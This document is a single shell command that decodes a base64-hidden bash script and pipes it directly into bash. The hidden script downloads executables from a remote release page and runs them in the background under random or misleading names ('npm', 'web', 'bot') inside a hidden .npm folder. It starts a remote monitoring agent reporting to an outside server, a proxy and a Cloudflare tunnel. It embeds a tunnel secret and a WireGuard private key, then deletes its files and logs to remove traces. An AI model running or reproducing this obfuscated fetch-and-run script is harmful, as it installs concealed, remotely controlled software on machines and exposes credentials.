echo "IyEvYmluL2Jhc2gKZXhwb3J0IFVVSUQ9JHtVVUlEOi0nM2ViNmU5MTctNzc0Yi00YTg0LWFmZjYtYjA1ODU3N2M2MGEzJ30KZXhwb3J0IE5FWkhBX1NFUlZFUj0ke05FWkhBX1NFUlZFUjotJ256LmY0aS5jbid9CmV4cG9ydCBORVpIQV9QT1JUPSR7TkVaSEFfUE9SVDotJzU1NTUnfQpleHBvcnQgTkVaSEFfS0VZPSR7TkVaSEFfS0VZOi0nJ30KZXhwb3J0IEFSR09fRE9NQUlOPSR7QVJHT19ET01BSU46LSdiYW5hbmExLm1lcnVjbW4uZXUub3JnJ30KZXhwb3J0IEFSR09fQVVUSD0ke0FSR09fQVVUSDotJ3siQWNjb3VudFRhZyI6Ijk5YWNlYWU1MmRjZDBhMWM0MmQzZDY5MDBmYTg3OWI2IiwiVHVubmVsU2VjcmV0IjoieVRTVkJqOHdMOGV0ZXpsdkwvTVBla3JaZGNrV3cvNVZCdjAvM0V3ZXM4TT0iLCJUdW5uZWxJRCI6ImZmZGY3YTA1LTBlZTAtNGYzYy1iMTc5LTVlNjIxNmY3ZDQxMCJ9J30KZXhwb3J0IENGSVA9JHtDRklQOi0nd3d3LnZpc2EuY29tLnR3J30KZXhwb3J0IENGUE9SVD0ke0NGUE9SVDotJzQ0Myd9CmV4cG9ydCBOQU1FPSR7TkFNRTotJ0dsaXRjaCd9CmV4cG9ydCBGSUxFX1BBVEg9JHtGSUxFX1BBVEg6LScuLy5ucG0nfQpleHBvcnQgQVJHT19QT1JUPSR7QVJHT19QT1JUOi0nODAwMSd9CgpbICEgLWQgIiR7RklMRV9QQVRIfSIgXSAmJiBta2RpciAtcCAiJHtGSUxFX1BBVEh9IiAmJiBybSAtcmYgJHtGSUxFX1BBVEh9L2Jvb3QubG9nICR7RklMRV9QQVRIfS9sb2cudHh0ICR7RklMRV9QQVRIfS9jb25maWcuanNvbiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwKCmFyZ29fY29uZmlndXJlKCkgewppZiBbWyAteiAkQVJHT19BVVRIIHx8IC16ICRBUkdPX0RPTUFJTiBdXTsgdGhlbgplY2hvIC1lICJcZVsxOzMybUFSR09fRE9NQUlOIG9yIEFSR09fQVVUSCB2YXJpYWJsZSBpcyBlbXB0eSwgdXNlIHF1aWNrIHR1bm5lbHNcZVswbSIKcmV0dXJuCmZpCgppZiBbWyAkQVJHT19BVVRIID1+IFR1bm5lbFNlY3JldCBdXTsgdGhlbgplY2hvICRBUkdPX0FVVEggPiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KY2F0ID4gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwgPDwgRU9GCnR1bm5lbDogJChjdXQgLWRcIiAtZjEyIDw8PCAiJEFSR09fQVVUSCIpCmNyZWRlbnRpYWxzLWZpbGU6ICR7RklMRV9QQVRIfS90dW5uZWwuanNvbgpwcm90b2NvbDogaHR0cDIKCmluZ3Jlc3M6Ci0gaG9zdG5hbWU6ICRBUkdPX0RPTUFJTgpzZXJ2aWNlOiBodHRwOi8vbG9jYWxob3N0OiRBUkdPX1BPUlQKb3JpZ2luUmVxdWVzdDoKbm9UTFNWZXJpZnk6IHRydWUKLSBzZXJ2aWNlOiBodHRwX3N0YXR1czo0MDQKRU9GCmVsc2UKZWNobyAtZSAiXGVbMTszMm1BUkdPX0FVVEggbWlzbWF0Y2ggVHVubmVsU2VjcmV0LHVzZSB0b2tlbiBjb25uZWN0IHRvIHR1bm5lbFxlWzBtIgpmaQp9CmFyZ29fY29uZmlndXJlCndhaXQKCmdlbmVyYXRlX2NvbmZpZygpIHsKY2F0ID4gJHtGSUxFX1BBVEh9L2NvbmZpZy5qc29uIDw8IEVPRgp7CiJsb2ciOiB7ICJhY2Nlc3MiOiAiL2Rldi9udWxsIiwgImVycm9yIjogIi9kZXYvbnVsbCIsICJsb2dsZXZlbCI6ICJub25lIiB9LAoiaW5ib3VuZHMiOiBbCnsKInBvcnQiOiAkQVJHT19QT1JULAoicHJvdG9jb2wiOiAidmxlc3MiLAoic2V0dGluZ3MiOiB7CiJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAiZmxvdyI6ICJ4dGxzLXJwcngtdmlzaW9uIiB9XSwKImRlY3J5cHRpb24iOiAibm9uZSIsCiJmYWxsYmFja3MiOiBbCnsgImRlc3QiOiAzMDAxIH0sIHsgInBhdGgiOiAiL3ZsZXNzIiwgImRlc3QiOiAzMDAyIH0seyAicGF0aCI6ICIvdm1lc3MiLCAiZGVzdCI6IDMwMDMgfSwgeyAicGF0aCI6ICIiLCAiZGVzdCI6IDMwMDQgfQpdCn0sCiJzdHJlYW1TZXR0aW5ncyI6IHsgIm5ldHdvcmsiOiAidGNwIiB9Cn0sCnsKInBvcnQiOiAzMDAxLCAibGlzdGVuIjogIjEyNy4wLjAuMSIsICJwcm90b2NvbCI6ICJ2bGVzcyIsCiJzZXR0aW5ncyI6IHsgImNsaWVudHMiOiBbeyAiaWQiOiAiJHtVVUlEfSIgfV0sICJkZWNyeXB0aW9uIjogIm5vbmUiIH0sCiJzdHJlYW1TZXR0aW5ncyI6IHsgIm5ldHdvcmsiOiAid3MiLCAic2VjdXJpdHkiOiAibm9uZSIgfQp9LAp7CiJwb3J0IjogMzAwMiwgImxpc3RlbiI6ICIxMjcuMC4wLjEiLCAicHJvdG9jb2wiOiAidmxlc3MiLAoic2V0dGluZ3MiOiB7ICJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAibGV2ZWwiOiAwIH1dLCAiZGVjcnlwdGlvbiI6ICJub25lIiB9LAoic3RyZWFtU2V0dGluZ3MiOiB7ICJuZXR3b3JrIjogIndzIiwgInNlY3VyaXR5IjogIm5vbmUiLCAid3NTZXR0aW5ncyI6IHsgInBhdGgiOiAiL3ZsZXNzIiB9IH0sCiJzbmlmZmluZyI6IHsgImRpc2FibGUiOiBmYWxzZSwgImRlc3RPdmVycmlkZSI6IFsiaHR0cCIsICJ0bHMiLCAicXVpYyJdLCAibWV0YWRhdGFPbmx5IjogZmFsc2UgfQp9LAp7CiJwb3J0IjogMzAwMywgImxpc3RlbiI6ICIxMjcuMC4wLjEiLCAicHJvdG9jb2wiOiAidm1lc3MiLAoic2V0dGluZ3MiOiB7ICJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAiYWx0ZXJJZCI6IDAgfV0gfSwKInN0cmVhbVNldHRpbmdzIjogeyAibmV0d29yayI6ICJ3cyIsICJ3c1NldHRpbmdzIjogeyAicGF0aCI6ICIvdm1lc3MiIH0gfSwKInNuaWZmaW5nIjogeyAiZGlzYWJsZSI6IGZhbHNlLCAiZGVzdE92ZXJyaWRlIjogWyJodHRwIiwgInRscyIsICJxdWljIl0sICJtZXRhZGF0YU9ubHkiOiBmYWxzZSB9Cn0sCnsKInBvcnQiOiAzMDA0LCAibGlzdGVuIjogIjEyNy4wLjAuMSIsICJwcm90b2NvbCI6ICJ2bWVzcyIsCiJzZXR0aW5ncyI6IHsiY2xpZW50cyI6IFt7ImlkIjogIiRVVUlEIiwgImFsdGVySWQiOiAwLCAic2VjdXJpdHkiOiAiYXV0byJ9XX0sCiJzdHJlYW1TZXR0aW5ncyI6IHsibmV0d29yayI6ICJzcGxpdGh0dHAiLCAic2VjdXJpdHkiOiAibm9uZSIsICJodHRwU2V0dGluZ3MiOiB7Imhvc3QiOiAiIiwgInBhdGgiOiAiIn19LAoic25pZmZpbmciOiB7ImRpc2FibGUiOiBmYWxzZSwgImRlc3RPdmVycmlkZSI6IFsiaHR0cCIsICJ0bHMiLCAicXVpYyJdLCAibWV0YWRhdGFPbmx5IjogZmFsc2V9Cn0KXSwKImRucyI6IHsgInNlcnZlcnMiOiBbImh0dHBzK2xvY2FsOi8vOC44LjguOC9kbnMtcXVlcnkiXSB9LAoib3V0Ym91bmRzIjogWwp7ICJwcm90b2NvbCI6ICJmcmVlZG9tIiB9LAp7CiJ0YWciOiAiV0FSUCIsICJwcm90b2NvbCI6ICJ3aXJlZ3VhcmQiLAoic2V0dGluZ3MiOiB7CiJzZWNyZXRLZXkiOiAiWUZZT0FkYncxYktUSGxOTmkrYUVqQk0zQk83dW51RkM1ck9rTVJBejlYWT0iLAoiYWRkcmVzcyI6IFsiMTcyLjE2LjAuMi8zMiIsICIyNjA2OjQ3MDA6MTEwOjhhMzY6ZGY5MjoxMDJhOjk2MDI6ZmExOC8xMjgiXSwKInBlZXJzIjogW3sgInB1YmxpY0tleSI6ICJibVhPQytGMUZ4RU1GOWR5aUsySDUvMVNVdHpIMEp1Vm81MWgyd1BmZ3lvPSIsICJhbGxvd2VkSVBzIjogWyIwLjAuMC4wLzAiLCAiOjovMCJdLCAiZW5kcG9pbnQiOiAiMTYyLjE1OS4xOTMuMTA6MjQwOCIgfV0sCiJyZXNlcnZlZCI6IFs3OCwgMTM1LCA3Nl0sICJtdHUiOiAxMjgwCn0KfQpdLAoicm91dGluZyI6IHsKImRvbWFpblN0cmF0ZWd5IjogIkFzSXMiLAoicnVsZXMiOiBbeyAidHlwZSI6ICJmaWVsZCIsICJkb21haW4iOiBbImRvbWFpbjpjaGF0Lm9wZW5haS5jb20iLCAiZG9tYWluOmNoYXRncHQuY29tIiwgImRvbWFpbjpvcGVuYWkuY29tIiwgImRvbWFpbjphaS5jb20iXSwgIm91dGJvdW5kVGFnIjogIldBUlAiIH1dCn0KfQpFT0YKfQpnZW5lcmF0ZV9jb25maWcKd2FpdAoKZG93bmxvYWRfYW5kX3J1biAoKSB7CkFSQ0g9JCh1bmFtZSAtbSkgJiYgRE9XTkxPQURfRElSPSIke0ZJTEVfUEFUSH0iICYmIG1rZGlyIC1wICIkRE9XTkxPQURfRElSIiAmJiBGSUxFX0lORk89KCkKaWYgWyAiJEFSQ0giID09ICJhcm0iIF0gfHwgWyAiJEFSQ0giID09ICJhcm02NCIgXSB8fCBbICIkQVJDSCIgPT0gImFhcmNoNjQiIF07IHRoZW4KRklMRV9JTkZPPSgiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvYXJtNjQvYm90MTMgYm90IiAiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvQVJNL3dlYiB3ZWIiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9BUk0vc3dpdGggbnBtIikKZWxpZiBbICIkQVJDSCIgPT0gImFtZDY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2XzY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2IiBdOyB0aGVuCkZJTEVfSU5GTz0oImh0dHBzOi8vZ2l0aHViLmNvbS9lb29jZS90ZXN0L3JlbGVhc2VzL2Rvd25sb2FkL2FtZDY0L2JvdDEzIGJvdCIgImh0dHBzOi8vZ2l0aHViLmNvbS9lb29jZS90ZXN0L3JlbGVhc2VzL2Rvd25sb2FkL2FtZDY0L3NlZW4gd2ViIiAiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvYnVsaWQvc3dpdGggbnBtIikKZWxzZQplY2hvICJVbnN1cHBvcnRlZCBhcmNoaXRlY3R1cmU6ICRBUkNIIgpleGl0IDEKZmkKZGVjbGFyZSAtQSBGSUxFX01BUApnZW5lcmF0ZV9yYW5kb21fbmFtZSgpIHsKbG9jYWwgY2hhcnM9YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwCmxvY2FsIG5hbWU9IiIKZm9yIGkgaW4gezEuLjZ9OyBkbwpuYW1lPSIkbmFtZSR7Y2hhcnM6UkFORE9NJSR7I2NoYXJzfToxfSIKZG9uZQplY2hvICIkbmFtZSIKfQpkb3dubG9hZF9maWxlKCkgewpsb2NhbCBVUkw9JDEKbG9jYWwgTkVXX0ZJTEVOQU1FPSQyCgppZiBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCmN1cmwgLUwgLXNTIC1vICIkTkVXX0ZJTEVOQU1FIiAiJFVSTCIKZWNobyAtZSAiXGVbMTszMm1Eb3dubG9hZGVkICRORVdfRklMRU5BTUUgYnkgY3VybFxlWzBtIgplbGlmIGNvbW1hbmQgLXYgd2dldCA+L2Rldi9udWxsIDI+JjE7IHRoZW4Kd2dldCAtcSAtTyAiJE5FV19GSUxFTkFNRSIgIiRVUkwiCmVjaG8gLWUgIlxlWzE7MzJtRG93bmxvYWRlZCAkTkVXX0ZJTEVOQU1FIGJ5IHdnZXRcZVswbSIKZWxzZQplY2hvIC1lICJcZVsxOzMzbU5laXRoZXIgY3VybCBub3Igd2dldCBpcyBhdmFpbGFibGUgZm9yIGRvd25sb2FkaW5nXGVbMG0iCmV4aXQgMQpmaQp9CmZvciBlbnRyeSBpbiAiJHtGSUxFX0lORk9bQF19IjsgZG8KVVJMPSQoZWNobyAiJGVudHJ5IiB8IGN1dCAtZCAnICcgLWYgMSkKUkFORE9NX05BTUU9JChnZW5lcmF0ZV9yYW5kb21fbmFtZSkKTkVXX0ZJTEVOQU1FPSIkRE9XTkxPQURfRElSLyRSQU5ET01fTkFNRSIKCmRvd25sb2FkX2ZpbGUgIiRVUkwiICIkTkVXX0ZJTEVOQU1FIgoKY2htb2QgK3ggIiRORVdfRklMRU5BTUUiCkZJTEVfTUFQWyQoZWNobyAiJGVudHJ5IiB8IGN1dCAtZCAnICcgLWYgMildPSIkTkVXX0ZJTEVOQU1FIgpkb25lCndhaXQKCmlmIFsgLWUgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbbnBtXX0pIiBdOyB0aGVuCnRsc1BvcnRzPSgiNDQzIiAiODQ0MyIgIjIwOTYiICIyMDg3IiAiMjA4MyIgIjIwNTMiKQppZiBbWyAiJHt0bHNQb3J0c1sqXX0iID1+ICIke05FWkhBX1BPUlR9IiBdXTsgdGhlbgpORVpIQV9UTFM9Ii0tdGxzIgplbHNlCk5FWkhBX1RMUz0iIgpmaQppZiBbIC1uICIkTkVaSEFfU0VSVkVSIiBdICYmIFsgLW4gIiRORVpIQV9QT1JUIiBdICYmIFsgLW4gIiRORVpIQV9LRVkiIF07IHRoZW4KZXhwb3J0IFRNUERJUj0kKHB3ZCkKbm9odXAgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbbnBtXX0pIiAtcyAke05FWkhBX1NFUlZFUn06JHtORVpIQV9QT1JUfSAtcCAke05FWkhBX0tFWX0gJHtORVpIQV9UTFN9ID4vZGV2L251bGwgMj4mMSAmCnNsZWVwIDEKcGdyZXAgLXggIiQoYmFzZW5hbWUgJHtGSUxFX01BUFtucG1dfSkiID4gL2Rldi9udWxsICYmIGVjaG8gLWUgIlxlWzE7MzJtJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSBpcyBydW5uaW5nXGVbMG0iIHx8IHsgZWNobyAtZSAiXGVbMTszNW1ucG0gaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICIkKGJhc2VuYW1lICR7RklMRV9NQVBbbnBtXX0pIiAmJiBub2h1cCAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFtucG1dfSkiIC1zICR7TkVaSEFfU0VSVkVSfToke05FWkhBX1BPUlR9IC1wICR7TkVaSEFfS0VZfSAke05FWkhBX1RMU30gPi9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMjsgZWNobyAtZSAiXGVbMTszNW0kKGJhc2VuYW1lICR7RklMRV9NQVBbbnBtXX0pIHJlc3RhcnRlZFxlWzBtIjsgfQplbHNlCmVjaG8gLWUgIlxlWzE7MzVtTkVaSEEgdmFyaWFibGUgaXMgZW1wdHksIHNraXBwaW5nIHJ1bm5pbmdcZVswbSIKZmkKZmkKCmlmIFsgLWUgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIiBdOyB0aGVuCm5vaHVwICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW3dlYl19KSIgLWMgIiR7RklMRV9QQVRIfS9jb25maWcuanNvbiIgPi9kZXYvbnVsbCAyPiYxICYKc2xlZXAgMQpwZ3JlcCAteCAiJChiYXNlbmFtZSAke0ZJTEVfTUFQW3dlYl19KSIgPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXGVbMTszMm0kKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIGlzIHJ1bm5pbmdcZVswbSIgfHwgeyBlY2hvIC1lICJcZVsxOzM1bSQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkgaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICIkKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIiAmJiBub2h1cCAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkiIC1jICR7RklMRV9QQVRIfS9jb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJiBzbGVlcCAyOyBlY2hvIC1lICJcZVsxOzM1bSQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkgcmVzdGFydGVkXGVbMG0iOyB9CmZpCgppZiBbIC1lICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSIgXTsgdGhlbgppZiBbWyAkQVJHT19BVVRIID1+IF5bQS1aMC05YS16PV17MTIwLDI1MH0kIF1dOyB0aGVuCmFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIHJ1biAtLXRva2VuICR7QVJHT19BVVRIfSIKZWxpZiBbWyAkQVJHT19BVVRIID1+IFR1bm5lbFNlY3JldCBdXTsgdGhlbgphcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLWNvbmZpZyB0dW5uZWwueW1sIHJ1biIKZWxzZQphcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiAtLWxvZ2ZpbGUgIiR7RklMRV9QQVRIfS9ib290LmxvZyIgLS1sb2dsZXZlbCBpbmZvIC0tdXJsIGh0dHA6Ly9sb2NhbGhvc3Q6JEFSR09fUE9SVCIKZmkKbm9odXAgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbYm90XX0pIiAkYXJncyA+L2Rldi9udWxsIDI+JjEgJgpzbGVlcCAyCnBncmVwIC14ICIkKGJhc2VuYW1lICR7RklMRV9NQVBbYm90XX0pIiA+IC9kZXYvbnVsbCAmJiBlY2hvIC1lICJcZVsxOzMybSQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkgaXMgcnVubmluZ1xlWzBtIiB8fCB7IGVjaG8gLWUgIlxlWzE7MzVtJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSBpcyBub3QgcnVubmluZywgcmVzdGFydGluZy4uLlxlWzBtIjsgcGtpbGwgLXggIiQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkiICYmIG5vaHVwICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSIgJGFyZ3MgPi9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMjsgZWNobyAtZSAiXGVbMTszNW0kKGJhc2VuYW1lICR7RklMRV9NQVBbYm90XX0pIHJlc3RhcnRlZFxlWzBtIjsgfQpmaQpzbGVlcCAyCnJtIC1mICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSIgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIiAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkiCn0KZG93bmxvYWRfYW5kX3J1bgoKZ2V0X2FyZ29kb21haW4oKSB7CmlmIFtbIC1uICRBUkdPX0FVVEggXV07IHRoZW4KZWNobyAiJEFSR09fRE9NQUlOIgplbHNlCmxvY2FsIHJldHJ5PTAKbG9jYWwgbWF4X3JldHJpZXM9Ngpsb2NhbCBhcmdvZG9tYWluPSIiCndoaWxlIFtbICRyZXRyeSAtbHQgJG1heF9yZXRyaWVzIF1dOyBkbwooKHJldHJ5KyspKQphcmdvZG9tYWluPSQoZ3JlcCAtb0UgJ2h0dHBzOi8vW1s6YWxudW06XStcLi1dK1wudHJ5Y2xvdWRmbGFyZVwuY29tJyAiJHtGSUxFX1BBVEh9L2Jvb3QubG9nIiB8IHNlZCAnc0BodHRwczovL0BAJykKaWYgW1sgLW4gJGFyZ29kb21haW4gXV07IHRoZW4KYnJlYWsKZmkKc2xlZXAgMQpkb25lCmVjaG8gIiRhcmdvZG9tYWluIgpmaQp9CgpnZW5lcmF0ZV9saW5rcygpIHsKYXJnb2RvbWFpbj0kKGdldF9hcmdvZG9tYWluKQplY2hvIC1lICJcZVsxOzMybUFyZ29Eb21haW46XGVbMTszNW0ke2FyZ29kb21haW59XGVbMG0iCnNsZWVwIDEKCmlzcD0kKGN1cmwgLXMgaHR0cHM6Ly9zcGVlZC5jbG91ZGZsYXJlLmNvbS9tZXRhIHwgYXdrIC1GXCIgJ3twcmludCAkMjYiLSIkMTh9JyB8IHNlZCAtZSAncy8gL18vZycpCnNsZWVwIDEKCmNhdCA+ICR7RklMRV9QQVRIfS9saXN0LnR4dCA8dmxlc3M6Ly8ke1VVSUR9QCR7Q0ZJUH06JHtDRlBPUlR9P2VuY3J5cHRpb249bm9uZSZzZWN1cml0eT10bHMmc25pPSR7YXJnb2RvbWFpbn0mdHlwZT13cyZob3N0PSR7YXJnb2RvbWFpbn0mcGF0aD0lMkZ2bGVzcyUzRmVkJTNEMjU2MCMke05BTUV9LSR7aXNwfQoKdm1lc3M6Ly8kKGVjaG8gInsgXCJ2XCI6IFwiMlwiLCBcInBzXCI6IFwiJHtOQU1FfS0ke2lzcH1cIiwgXCJhZGRcIjogXCIke0NGSVB9XCIsIFwicG9ydFwiOiBcIiR7Q0ZQT1JUfVwiLCBcImlkXCI6IFwiJHtVVUlEfVwiLCBcImFpZFwiOiBcIjBcIiwgXCJzY3lcIjogXCJub25lXCIsIFwibmV0XCI6IFwid3NcIiwgXCJ0eXBlXCI6IFwibm9uZVwiLCBcImhvc3RcIjogXCIke2FyZ29kb21haW59XCIsIFwicGF0aFwiOiBcIi92bWVzcz9lZD0yNTYwXCIsIFwidGxzXCI6IFwidGxzXCIsIFwic25pXCI6IFwiJHthcmdvZG9tYWlufVwiLCBcImFscG5cIjogXCJcIiB9IiB8IGJhc2U2NCAtdzApCgp2bWVzczovLyQoZWNobyAieyBcInZcIjogXCIyXCIsIFwicHNcIjogXCIke05BTUV9LSR7aXNwfVwiLCBcImFkZFwiOiBcIiR7Q0ZJUH1cIiwgXCJwb3J0XCI6IFwiJHtDRlBPUlR9XCIsIFwiaWRcIjogXCIke1VVSUR9XCIsIFwiYWlkXCI6IFwiMFwiLCBcInNjeVwiOiBcIm5vbmVcIiwgXCJuZXRcIjogXCJzcGxpdGh0dHBcIiwgXCJ0eXBlXCI6IFwibm9uZVwiLCBcImhvc3RcIjogXCIke2FyZ29kb21haW59XCIsIFwicGF0aFwiOiBcIlwiLCBcInRsc1wiOiBcInRsc1wiLCBcInNuaVwiOiBcIiR7YXJnb2RvbWFpbn1cIiwgXCJhbHBuXCI6IFwiXCIgfSIgfCBiYXNlNjQgLXcwKQpFT0YKCmJhc2U2NCAtdzAgJHtGSUxFX1BBVEh9L2xpc3QudHh0ID4gJHtGSUxFX1BBVEh9L2xvZy50eHQKY2F0ICR7RklMRV9QQVRIfS9sb2cudHh0CmVjaG8gLWUgIlxuXGVbMTszMm0ke0ZJTEVfUEFUSH0vc3ViLnR4dCBzYXZlZCBzdWNjZXNzZnVsbHlcZVswbSIKc2xlZXAgNQpybSAtcmYgJHtGSUxFX1BBVEh9L2xpc3QudHh0ICR7RklMRV9QQVRIfS9ib290LmxvZyAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gJHtGSUxFX1BBVEh9L3R1bm5lbC5qc29uICR7RklMRV9QQVRIfS90dW5uZWwueW1sICR7RklMRV9QQVRIfS9ucG0gJHtGSUxFX1BBVEh9L3dlYiAke0ZJTEVfUEFUSH0vYm90IGZha2VfdXNlcmFnZW50XzAuMi4wLmpzb24KfQpnZW5lcmF0ZV9saW5rcwplY2hvIC1lICJcZVsxOzk2bVJ1bm5pbmcgZG9uZSFcZVswbSIKc2xlZXAgOApjbGVhcgoKZWNobyAtZSAiXGVbMTs5Nm1UaGFuayB5b3UgZm9yIHVzaW5nIHRoaXMgc2NyaXB0LGVuam95IVxlWzBtIgoKZXhpdCAw" | base64 -d | bash
